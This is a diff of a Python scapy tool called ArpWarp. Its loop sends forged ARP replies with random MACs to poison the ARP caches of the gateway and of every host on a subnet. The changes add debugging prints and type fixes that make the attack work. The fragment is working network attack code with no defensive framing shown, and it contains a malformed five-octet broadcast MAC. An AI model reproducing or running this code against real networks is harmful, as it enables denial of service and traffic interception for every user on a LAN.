@@ -53,7 +53,7 @@ class ArpWarp:
             raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ip}")
 
         self.host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
-                         host_ip != self.my_private_ip and host_ip != self.gateway_ip}
+                         host_ip != self.my_private_ip and host_ip != self.gateway_ip}  # TODO where are the rest
         print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")
 
         self.abort = False
@@ -65,10 +65,12 @@ class ArpWarp:
         """
         for host_ip in self.host_ips:
             # poison gateways's arp cache
-            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
+            print(self.gateway_ip)
+            arp_packet_gateway = ARP(op=2, psrc=str(host_ip), hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
+            print(host_ip)
             sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
             # poison host's arp cache
-            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=host_ip)
+            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=str(host_ip))
             sendp(Ether(dst='ff:ff:ff:ff:ff') / arp_packet_host, iface=self.network_interface)
 
     def start_attack(self):
